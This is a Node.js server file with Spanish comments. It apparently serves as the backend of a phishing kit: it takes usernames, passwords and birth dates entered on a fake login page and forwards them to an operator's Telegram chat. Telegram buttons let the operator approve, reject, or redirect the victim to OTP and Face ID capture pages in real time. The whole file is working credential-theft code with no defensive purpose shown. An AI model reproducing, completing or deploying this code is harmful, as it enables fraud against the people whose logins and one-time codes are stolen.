require('dotenv').config();
const express = require('express');
const app = express();
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const bodyParser = require('body-parser');

// Crear el servidor HTTP y configurar Socket.IO
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*", // Permitir todas las fuentes en desarrollo
    methods: ["GET", "POST"]
  }
});

// Configuración del bot de Telegram
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const telegramChatId = process.env.TELEGRAM_CHAT_ID;
const activeSockets = new Map();

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Manejo de conexiones de Socket.IO
io.on('connection', (socket) => {
  console.log('🧠 Usuario conectado:', socket.id);

  // Al recibir datos de formulario, almacenar sesión
  socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `🔐 Nuevo intento de acceso BILLET:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
            { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` },
            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Otros eventos de formulario y botones, como código OTP, error de logo, etc.
  // (Aquí sigues igual con tu estructura de eventos)

  // Escucha para redirección desde botones en el HTML
  socket.on('redirigir', ({ url, sessionId }) => {
    const socketTarget = activeSockets.get(sessionId);
    if (socketTarget) {
      socketTarget.emit('redirigir', url); // Emitir la URL de redirección
    }
  });

  // Redirección al presionar el botón TC
  socket.on('accionTC', ({ sessionId }) => {
    const socketTarget = activeSockets.get(sessionId);
    if (!socketTarget) {
      console.log("⚠️ No se encontró la sesión del usuario.");
      return;
    }

    // Enviar mensaje a Telegram
    bot.sendMessage(telegramChatId, '🟨 Redirigiendo a Face ID...');

    // Emitir la redirección a face.html
    socketTarget.emit('redirigir', 'face.html');
  });

  // Respuesta a botones desde Telegram
  bot.on('callback_query', (query) => {
    const data = query.data;
    const chatId = query.message.chat.id;
    const callbackId = query.id;
    const sessionId = data.split('_')[1];
    const socket = activeSockets.get(sessionId);

    bot.answerCallbackQuery(callbackId); // Responder al callback de Telegram

    if (!socket) {
      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
      return;
    }

    // Decisiones según el tipo de botón presionado
    if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
      const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
      socket.emit('respuesta', decision);
      bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
    }

    // Otros casos como OTP, error, finalización, etc.
    // (Similar a cómo lo manejaste para el evento 'callback_query')

    activeSockets.delete(sessionId);
  });
});

// Configuración de servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor escuchando en el puerto ${PORT}`);
});
